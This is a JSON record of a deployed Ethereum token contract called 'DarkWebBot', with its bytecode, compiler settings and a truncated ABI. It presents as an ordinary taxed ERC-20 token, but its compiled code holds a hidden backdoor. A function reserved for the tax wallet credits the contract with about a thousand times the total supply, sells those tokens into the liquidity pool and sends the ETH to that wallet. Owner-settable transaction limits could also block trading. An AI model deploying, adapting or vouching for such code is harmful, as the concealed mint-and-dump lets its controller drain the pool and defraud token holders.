{
    "address": "0x1871d9f06F91AD65c92bD2c67eB85B3EBd5d7501",
    "tx_hash": "44264e377a72a94f829e0736d428095952fde242a2e9fe5f10cc164f0523b9ce",
    "block_number": 18009212,
    "timestamp": 1693178195,
    "gas_used_in_creation": 1805145,
    "creation_bytecode": "60806040526005805460ff191660011790556200001f6009600a6200030d565b620000309064037e11d60062000324565b600655620000416009600a6200030d565b62000052906406fc23ac0062000324565b600755620000636009600a6200030d565b6200007390633b9aca0062000324565b60085560036009819055600a55600d805461ffff60a81b191690553480156200009a575f80fd5b505f80546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a35060058054610100600160a81b0319166101003302179055620001006009600a6200030d565b620001119064174876e80062000324565b335f9081526001602081905260408220929092556003906200013a5f546001600160a01b031690565b6001600160a01b03908116825260208083019390935260409182015f908120805495151560ff19968716179055308152600390935281832080548516600190811790915560055461010090049091168352912080549092161790556200019d3390565b6001600160a01b03165f7fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620001d66009600a6200030d565b620001e79064174876e80062000324565b60405190815260200160405180910390a36200033e565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200025257815f1904821115620002365762000236620001fe565b808516156200024457918102915b93841c939080029062000217565b509250929050565b5f826200026a5750600162000307565b816200027857505f62000307565b81600181146200029157600281146200029c57620002bc565b600191505062000307565b60ff841115620002b057620002b0620001fe565b50506001821b62000307565b5060208310610133831016604e8410600b8410161715620002e1575081810a62000307565b620002ed838362000212565b805f1904821115620003035762000303620001fe565b0290505b92915050565b5f6200031d60ff8416836200025a565b9392505050565b8082028115828204841417620003075762000307620001fe565b611b47806200034c5f395ff3fe60806040526004361061013f575f3560e01c806374010ece116100b3578063a9059cbb1161006d578063a9059cbb14610376578063c448500c14610395578063c492f046146103b4578063c9567bf9146103d3578063dd62ed3e146103e7578063ea1644d51461042b575f80fd5b806374010ece146102c4578063751039fc146102e35780637d1db4a5146102f75780638da5cb5b1461030c5780638f9a55c01461033257806395d89b4114610347575f80fd5b806323b872dd1161010457806323b872dd1461020d578063313ce5671461022c57806351bc3c85146102475780636d8aa8f81461025d57806370a082311461027c578063715018a6146102b0575f80fd5b806306fdde031461014a578063095ea7b31461018e5780630a702e8d146101bd5780630faee56f146101d657806318160ddd146101f9575f80fd5b3661014657005b5f80fd5b348015610155575f80fd5b5060408051808201909152600a81526911185c9ad5d958909bdd60b21b60208201525b6040516101859190611680565b60405180910390f35b348015610199575f80fd5b506101ad6101a83660046116e2565b61044a565b6040519015158152602001610185565b3480156101c8575f80fd5b506005546101ad9060ff1681565b3480156101e1575f80fd5b506101eb60085481565b604051908152602001610185565b348015610204575f80fd5b506101eb610460565b348015610218575f80fd5b506101ad61022736600461170c565b610481565b348015610237575f80fd5b5060405160098152602001610185565b348015610252575f80fd5b5061025b6104e8565b005b348015610268575f80fd5b5061025b610277366004611757565b61057f565b348015610287575f80fd5b506101eb610296366004611772565b6001600160a01b03165f9081526001602052604090205490565b3480156102bb575f80fd5b5061025b6105cf565b3480156102cf575f80fd5b5061025b6102de36600461178d565b610640565b3480156102ee575f80fd5b5061025b61066e565b348015610302575f80fd5b506101eb60065481565b348015610317575f80fd5b505f546040516001600160a01b039091168152602001610185565b34801561033d575f80fd5b506101eb60075481565b348015610352575f80fd5b506040805180820190915260078152662230b935abb2b160c91b6020820152610178565b348015610381575f80fd5b506101ad6103903660046116e2565b61072c565b3480156103a0575f80fd5b5061025b6103af366004611772565b610738565b3480156103bf575f80fd5b5061025b6103ce3660046117a4565b610789565b3480156103de575f80fd5b5061025b610826565b3480156103f2575f80fd5b506101eb610401366004611823565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b348015610436575f80fd5b5061025b61044536600461178d565b610bd4565b5f610456338484610c02565b5060015b92915050565b5f61046d6009600a61194e565b61047c9064174876e80061195c565b905090565b5f61048d848484610d25565b6104de84336104d985604051806060016040528060288152602001611aea602891396001600160a01b038a165f90815260026020908152604080832033845290915290205491906112f8565b610c02565b5060019392505050565b60055461010090046001600160a01b0316336001600160a01b03161461050c575f80fd5b61054b61051b6009600a61194e565b61052a9064174876e80061195c565b610536906103e861195c565b305f9081526001602052604090205490611330565b305f908152600160205260409020819055801561056b5761056b81611395565b47801561057b5761057b81611505565b5050565b5f546001600160a01b031633146105b15760405162461bcd60e51b81526004016105a890611973565b60405180910390fd5b600d8054911515600160b01b0260ff60b01b19909216919091179055565b5f546001600160a01b031633146105f85760405162461bcd60e51b81526004016105a890611973565b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146106695760405162461bcd60e51b81526004016105a890611973565b600655565b5f546001600160a01b031633146106975760405162461bcd60e51b81526004016105a890611973565b6106a36009600a61194e565b6106b29064174876e80061195c565b6006556106c16009600a61194e565b6106d09064174876e80061195c565b6007556005805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61070a6009600a61194e565b6107199064174876e80061195c565b60405190815260200160405180910390a1565b5f610456338484610d25565b5f546001600160a01b031633146107615760405162461bcd60e51b81526004016105a890611973565b600580546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b5f546001600160a01b031633146107b25760405162461bcd60e51b81526004016105a890611973565b5f5b82811015610820578160035f8686858181106107d2576107d26119a8565b90506020020160208101906107e79190611772565b6001600160a01b0316815260208101919091526040015f20805460ff191691151591909117905580610818816119bc565b9150506107b4565b50505050565b5f546001600160a01b0316331461084f5760405162461bcd60e51b81526004016105a890611973565b600d54600160a01b900460ff16156108a95760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e00000000000000000060448201526064016105a8565b600c80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556108f39030906108e46009600a61194e565b6104d99064174876e80061195c565b600c5f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610943573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061096791906119d4565b6001600160a01b031663c9c6539630600c5f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156109c6573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109ea91906119d4565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610a34573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a5891906119d4565b600d80546001600160a01b039283166001600160a01b0319909116179055600c541663f305d7194730610a9f816001600160a01b03165f9081526001602052604090205490565b5f80610ab25f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610b18573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190610b3d91906119ef565b5050600d54600c5460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af1158015610b92573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610bb69190611a1a565b50600d805462ff00ff60a01b19166201000160a01b17905543600b55565b5f546001600160a01b03163314610bfd5760405162461bcd60e51b81526004016105a890611973565b600755565b6001600160a01b038316610c645760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016105a8565b6001600160a01b038216610cc55760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016105a8565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610d895760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016105a8565b6001600160a01b038216610deb5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016105a8565b5f8111610e4c5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016105a8565b5f80546001600160a01b03858116911614801590610e7757505f546001600160a01b03848116911614155b156111bb57600d546001600160a01b038581169116148015610ea157506001600160a01b03831632145b15610ec957610ec66064610ec06009548561154090919063ffffffff16565b906115be565b90505b60055460ff1615610fac57600c546001600160a01b03848116911614801590610f005750600d546001600160a01b03848116911614155b15610fac57325f908152600460205260409020544311610f9a5760405162461bcd60e51b815260206004820152604960248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b6064820152681030b63637bbb2b21760b91b608482015260a4016105a8565b325f9081526004602052604090204390555b600d546001600160a01b038581169116148015610fd75750600c546001600160a01b03848116911614155b8015610ffb57506001600160a01b0383165f9081526003602052604090205460ff16155b8015611015575043600b5460016110129190611a35565b10155b156110e65760065482111561106c5760405162461bcd60e51b815260206004820152601960248201527f4578636565647320746865205f6d61785478416d6f756e742e0000000000000060448201526064016105a8565b6007548261108e856001600160a01b03165f9081526001602052604090205490565b6110989190611a35565b11156110e65760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e00000000000060448201526064016105a8565b600d546001600160a01b03848116911614801561110c57506001600160a01b0384163014155b1561112e5761112b6064610ec0600a548561154090919063ffffffff16565b90505b600d54600160a81b900460ff161580156111555750600d546001600160a01b038481169116145b801561116a5750600d54600160b01b900460ff165b156111bb576111a96111a48361119f611197306001600160a01b03165f9081526001602052604090205490565b6008546115ff565b6115ff565b611395565b4780156111b9576111b947611505565b505b801561123357305f908152600160205260409020546111da9082611330565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061122a9085815260200190565b60405180910390a35b6001600160a01b0384165f908152600160205260409020546112559083611613565b6001600160a01b0385165f9081526001602052604090205561129861127a8383611613565b6001600160a01b0385165f9081526001602052604090205490611330565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6112e18585611613565b60405190815260200160405180910390a350505050565b5f818484111561131b5760405162461bcd60e51b81526004016105a89190611680565b505f6113278486611a48565b95945050505050565b5f8061133c8385611a35565b90508381101561138e5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016105a8565b9392505050565b600d805460ff60a81b1916600160a81b1790556040805160028082526060820183525f9260208301908036833701905050905030815f815181106113db576113db6119a8565b6001600160a01b03928316602091820292909201810191909152600c54604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611432573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061145691906119d4565b81600181518110611469576114696119a8565b6001600160a01b039283166020918202929092010152600c5461148f9130911684610c02565b600c5460405163791ac94760e01b81526001600160a01b039091169063791ac947906114c79085905f90869030904290600401611a5b565b5f604051808303815f87803b1580156114de575f80fd5b505af11580156114f0573d5f803e3d5ffd5b5050600d805460ff60a81b1916905550505050565b6005546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f1935050505015801561057b573d5f803e3d5ffd5b5f825f0361154f57505f61045a565b5f61155a838561195c565b9050826115678583611aca565b1461138e5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016105a8565b5f61138e83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250611654565b5f81831161160d578261138e565b50919050565b5f61138e83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506112f8565b5f81836116745760405162461bcd60e51b81526004016105a89190611680565b505f6113278486611aca565b5f6020808352835180828501525f5b818110156116ab5785810183015185820160400152820161168f565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b03811681146116df575f80fd5b50565b5f80604083850312156116f3575f80fd5b82356116fe816116cb565b946020939093013593505050565b5f805f6060848603121561171e575f80fd5b8335611729816116cb565b92506020840135611739816116cb565b929592945050506040919091013590565b80151581146116df575f80fd5b5f60208284031215611767575f80fd5b813561138e8161174a565b5f60208284031215611782575f80fd5b813561138e816116cb565b5f6020828403121561179d575f80fd5b5035919050565b5f805f604084860312156117b6575f80fd5b833567ffffffffffffffff808211156117cd575f80fd5b818601915086601f8301126117e0575f80fd5b8135818111156117ee575f80fd5b8760208260051b8501011115611802575f80fd5b602092830195509350508401356118188161174a565b809150509250925092565b5f8060408385031215611834575f80fd5b823561183f816116cb565b9150602083013561184f816116cb565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156118a857815f190482111561188e5761188e61185a565b8085161561189b57918102915b93841c9390800290611873565b509250929050565b5f826118be5750600161045a565b816118ca57505f61045a565b81600181146118e057600281146118ea57611906565b600191505061045a565b60ff8411156118fb576118fb61185a565b50506001821b61045a565b5060208310610133831016604e8410600b8410161715611929575081810a61045a565b611933838361186e565b805f19048211156119465761194661185a565b029392505050565b5f61138e60ff8416836118b0565b808202811582820484141761045a5761045a61185a565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b5f52603260045260245ffd5b5f600182016119cd576119cd61185a565b5060010190565b5f602082840312156119e4575f80fd5b815161138e816116cb565b5f805f60608486031215611a01575f80fd5b8351925060208401519150604084015190509250925092565b5f60208284031215611a2a575f80fd5b815161138e8161174a565b8082018082111561045a5761045a61185a565b8181038181111561045a5761045a61185a565b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b81811015611aa95784516001600160a01b031683529383019391830191600101611a84565b50506001600160a01b03969096166060850152505050608001529392505050565b5f82611ae457634e487b7160e01b5f52601260045260245ffd5b50049056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220dad4ce21d432d6019842293bf8a6671215b8f0c947d9239a984ec33e221aad1a64736f6c63430008150033",
    "runtime_bytecode": "60806040526004361061013f575f3560e01c806374010ece116100b3578063a9059cbb1161006d578063a9059cbb14610376578063c448500c14610395578063c492f046146103b4578063c9567bf9146103d3578063dd62ed3e146103e7578063ea1644d51461042b575f80fd5b806374010ece146102c4578063751039fc146102e35780637d1db4a5146102f75780638da5cb5b1461030c5780638f9a55c01461033257806395d89b4114610347575f80fd5b806323b872dd1161010457806323b872dd1461020d578063313ce5671461022c57806351bc3c85146102475780636d8aa8f81461025d57806370a082311461027c578063715018a6146102b0575f80fd5b806306fdde031461014a578063095ea7b31461018e5780630a702e8d146101bd5780630faee56f146101d657806318160ddd146101f9575f80fd5b3661014657005b5f80fd5b348015610155575f80fd5b5060408051808201909152600a81526911185c9ad5d958909bdd60b21b60208201525b6040516101859190611680565b60405180910390f35b348015610199575f80fd5b506101ad6101a83660046116e2565b61044a565b6040519015158152602001610185565b3480156101c8575f80fd5b506005546101ad9060ff1681565b3480156101e1575f80fd5b506101eb60085481565b604051908152602001610185565b348015610204575f80fd5b506101eb610460565b348015610218575f80fd5b506101ad61022736600461170c565b610481565b348015610237575f80fd5b5060405160098152602001610185565b348015610252575f80fd5b5061025b6104e8565b005b348015610268575f80fd5b5061025b610277366004611757565b61057f565b348015610287575f80fd5b506101eb610296366004611772565b6001600160a01b03165f9081526001602052604090205490565b3480156102bb575f80fd5b5061025b6105cf565b3480156102cf575f80fd5b5061025b6102de36600461178d565b610640565b3480156102ee575f80fd5b5061025b61066e565b348015610302575f80fd5b506101eb60065481565b348015610317575f80fd5b505f546040516001600160a01b039091168152602001610185565b34801561033d575f80fd5b506101eb60075481565b348015610352575f80fd5b506040805180820190915260078152662230b935abb2b160c91b6020820152610178565b348015610381575f80fd5b506101ad6103903660046116e2565b61072c565b3480156103a0575f80fd5b5061025b6103af366004611772565b610738565b3480156103bf575f80fd5b5061025b6103ce3660046117a4565b610789565b3480156103de575f80fd5b5061025b610826565b3480156103f2575f80fd5b506101eb610401366004611823565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b348015610436575f80fd5b5061025b61044536600461178d565b610bd4565b5f610456338484610c02565b5060015b92915050565b5f61046d6009600a61194e565b61047c9064174876e80061195c565b905090565b5f61048d848484610d25565b6104de84336104d985604051806060016040528060288152602001611aea602891396001600160a01b038a165f90815260026020908152604080832033845290915290205491906112f8565b610c02565b5060019392505050565b60055461010090046001600160a01b0316336001600160a01b03161461050c575f80fd5b61054b61051b6009600a61194e565b61052a9064174876e80061195c565b610536906103e861195c565b305f9081526001602052604090205490611330565b305f908152600160205260409020819055801561056b5761056b81611395565b47801561057b5761057b81611505565b5050565b5f546001600160a01b031633146105b15760405162461bcd60e51b81526004016105a890611973565b60405180910390fd5b600d8054911515600160b01b0260ff60b01b19909216919091179055565b5f546001600160a01b031633146105f85760405162461bcd60e51b81526004016105a890611973565b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146106695760405162461bcd60e51b81526004016105a890611973565b600655565b5f546001600160a01b031633146106975760405162461bcd60e51b81526004016105a890611973565b6106a36009600a61194e565b6106b29064174876e80061195c565b6006556106c16009600a61194e565b6106d09064174876e80061195c565b6007556005805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61070a6009600a61194e565b6107199064174876e80061195c565b60405190815260200160405180910390a1565b5f610456338484610d25565b5f546001600160a01b031633146107615760405162461bcd60e51b81526004016105a890611973565b600580546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b5f546001600160a01b031633146107b25760405162461bcd60e51b81526004016105a890611973565b5f5b82811015610820578160035f8686858181106107d2576107d26119a8565b90506020020160208101906107e79190611772565b6001600160a01b0316815260208101919091526040015f20805460ff191691151591909117905580610818816119bc565b9150506107b4565b50505050565b5f546001600160a01b0316331461084f5760405162461bcd60e51b81526004016105a890611973565b600d54600160a01b900460ff16156108a95760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e00000000000000000060448201526064016105a8565b600c80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556108f39030906108e46009600a61194e565b6104d99064174876e80061195c565b600c5f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610943573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061096791906119d4565b6001600160a01b031663c9c6539630600c5f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156109c6573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109ea91906119d4565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610a34573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a5891906119d4565b600d80546001600160a01b039283166001600160a01b0319909116179055600c541663f305d7194730610a9f816001600160a01b03165f9081526001602052604090205490565b5f80610ab25f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610b18573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190610b3d91906119ef565b5050600d54600c5460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af1158015610b92573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610bb69190611a1a565b50600d805462ff00ff60a01b19166201000160a01b17905543600b55565b5f546001600160a01b03163314610bfd5760405162461bcd60e51b81526004016105a890611973565b600755565b6001600160a01b038316610c645760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016105a8565b6001600160a01b038216610cc55760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016105a8565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610d895760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016105a8565b6001600160a01b038216610deb5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016105a8565b5f8111610e4c5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016105a8565b5f80546001600160a01b03858116911614801590610e7757505f546001600160a01b03848116911614155b156111bb57600d546001600160a01b038581169116148015610ea157506001600160a01b03831632145b15610ec957610ec66064610ec06009548561154090919063ffffffff16565b906115be565b90505b60055460ff1615610fac57600c546001600160a01b03848116911614801590610f005750600d546001600160a01b03848116911614155b15610fac57325f908152600460205260409020544311610f9a5760405162461bcd60e51b815260206004820152604960248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b6064820152681030b63637bbb2b21760b91b608482015260a4016105a8565b325f9081526004602052604090204390555b600d546001600160a01b038581169116148015610fd75750600c546001600160a01b03848116911614155b8015610ffb57506001600160a01b0383165f9081526003602052604090205460ff16155b8015611015575043600b5460016110129190611a35565b10155b156110e65760065482111561106c5760405162461bcd60e51b815260206004820152601960248201527f4578636565647320746865205f6d61785478416d6f756e742e0000000000000060448201526064016105a8565b6007548261108e856001600160a01b03165f9081526001602052604090205490565b6110989190611a35565b11156110e65760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e00000000000060448201526064016105a8565b600d546001600160a01b03848116911614801561110c57506001600160a01b0384163014155b1561112e5761112b6064610ec0600a548561154090919063ffffffff16565b90505b600d54600160a81b900460ff161580156111555750600d546001600160a01b038481169116145b801561116a5750600d54600160b01b900460ff165b156111bb576111a96111a48361119f611197306001600160a01b03165f9081526001602052604090205490565b6008546115ff565b6115ff565b611395565b4780156111b9576111b947611505565b505b801561123357305f908152600160205260409020546111da9082611330565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061122a9085815260200190565b60405180910390a35b6001600160a01b0384165f908152600160205260409020546112559083611613565b6001600160a01b0385165f9081526001602052604090205561129861127a8383611613565b6001600160a01b0385165f9081526001602052604090205490611330565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6112e18585611613565b60405190815260200160405180910390a350505050565b5f818484111561131b5760405162461bcd60e51b81526004016105a89190611680565b505f6113278486611a48565b95945050505050565b5f8061133c8385611a35565b90508381101561138e5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016105a8565b9392505050565b600d805460ff60a81b1916600160a81b1790556040805160028082526060820183525f9260208301908036833701905050905030815f815181106113db576113db6119a8565b6001600160a01b03928316602091820292909201810191909152600c54604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611432573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061145691906119d4565b81600181518110611469576114696119a8565b6001600160a01b039283166020918202929092010152600c5461148f9130911684610c02565b600c5460405163791ac94760e01b81526001600160a01b039091169063791ac947906114c79085905f90869030904290600401611a5b565b5f604051808303815f87803b1580156114de575f80fd5b505af11580156114f0573d5f803e3d5ffd5b5050600d805460ff60a81b1916905550505050565b6005546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f1935050505015801561057b573d5f803e3d5ffd5b5f825f0361154f57505f61045a565b5f61155a838561195c565b9050826115678583611aca565b1461138e5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016105a8565b5f61138e83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250611654565b5f81831161160d578261138e565b50919050565b5f61138e83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506112f8565b5f81836116745760405162461bcd60e51b81526004016105a89190611680565b505f6113278486611aca565b5f6020808352835180828501525f5b818110156116ab5785810183015185820160400152820161168f565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b03811681146116df575f80fd5b50565b5f80604083850312156116f3575f80fd5b82356116fe816116cb565b946020939093013593505050565b5f805f6060848603121561171e575f80fd5b8335611729816116cb565b92506020840135611739816116cb565b929592945050506040919091013590565b80151581146116df575f80fd5b5f60208284031215611767575f80fd5b813561138e8161174a565b5f60208284031215611782575f80fd5b813561138e816116cb565b5f6020828403121561179d575f80fd5b5035919050565b5f805f604084860312156117b6575f80fd5b833567ffffffffffffffff808211156117cd575f80fd5b818601915086601f8301126117e0575f80fd5b8135818111156117ee575f80fd5b8760208260051b8501011115611802575f80fd5b602092830195509350508401356118188161174a565b809150509250925092565b5f8060408385031215611834575f80fd5b823561183f816116cb565b9150602083013561184f816116cb565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156118a857815f190482111561188e5761188e61185a565b8085161561189b57918102915b93841c9390800290611873565b509250929050565b5f826118be5750600161045a565b816118ca57505f61045a565b81600181146118e057600281146118ea57611906565b600191505061045a565b60ff8411156118fb576118fb61185a565b50506001821b61045a565b5060208310610133831016604e8410600b8410161715611929575081810a61045a565b611933838361186e565b805f19048211156119465761194661185a565b029392505050565b5f61138e60ff8416836118b0565b808202811582820484141761045a5761045a61185a565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b5f52603260045260245ffd5b5f600182016119cd576119cd61185a565b5060010190565b5f602082840312156119e4575f80fd5b815161138e816116cb565b5f805f60608486031215611a01575f80fd5b8351925060208401519150604084015190509250925092565b5f60208284031215611a2a575f80fd5b815161138e8161174a565b8082018082111561045a5761045a61185a565b8181038181111561045a5761045a61185a565b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b81811015611aa95784516001600160a01b031683529383019391830191600101611a84565b50506001600160a01b03969096166060850152505050608001529392505050565b5f82611ae457634e487b7160e01b5f52601260045260245ffd5b50049056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220dad4ce21d432d6019842293bf8a6671215b8f0c947d9239a984ec33e221aad1a64736f6c63430008150033",
    "contract_name": "DarkWebBot",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf